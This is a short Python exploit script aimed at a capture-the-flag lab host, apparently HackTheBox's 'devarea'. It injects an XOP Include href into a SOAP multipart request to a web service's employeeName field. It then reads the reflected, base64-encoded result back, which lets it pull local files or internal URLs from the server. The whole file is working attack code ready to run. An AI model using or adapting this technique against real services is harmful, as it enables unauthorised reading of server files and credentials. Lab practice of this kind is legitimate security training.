#!/usr/bin/env python3
import argparse
import base64
import re
import requests

URL = "http://devarea.htb:8080/employeeservice"


def request_href(href: str, timeout: int):
    boundary = "----kkkkkk123123213"
    envelope = (
        '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" '
        'xmlns:htb="http://devarea.htb/" xmlns:xop="http://www.w3.org/2004/08/xop/include">'
        '<soapenv:Header/><soapenv:Body><htb:submitReport><arg0>'
        f'<employeeName><xop:Include href="{href}"/></employeeName>'
        '<department>it</department><content>probe</content><confidential>false</confidential>'
        '</arg0></htb:submitReport></soapenv:Body></soapenv:Envelope>'
    )
    body = (
        f"--{boundary}\r\n"
        "Content-Disposition: form-data; name=\"1\"\r\n"
        "Content-Type: text/xml; charset=UTF-8\r\n\r\n"
        f"{envelope}\r\n"
        f"--{boundary}--\r\n"
    )
    headers = {"Content-Type": f"multipart/related; boundary={boundary}"}
    r = requests.post(URL, data=body.encode(), headers=headers, timeout=timeout)
    return r.status_code, r.text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("href")
    parser.add_argument("--timeout", type=int, default=25)
    args = parser.parse_args()

    try:
        status, text = request_href(args.href, args.timeout)
    except requests.RequestException as exc:
        print(f"REQUEST_ERROR: {exc}")
        raise SystemExit(0)
    print(f"STATUS: {status}")
    m = re.search(r"Report received from (.*?)\. Department:", text, re.S)
    if not m:
        print("No reflected employeeName found")
        print(text[:1200])
        raise SystemExit(0)

    raw = m.group(1)
    print(f"REFLECTED_RAW_LEN: {len(raw)}")
    print(f"REFLECTED_RAW_PREVIEW: {raw[:120]}")

    try:
        decoded = base64.b64decode(raw + "===", validate=False)
        print("DECODED_PREVIEW:")
        print(decoded[:4000].decode("utf-8", errors="replace"))
    except Exception as exc:
        print(f"Base64 decode error: {exc}")
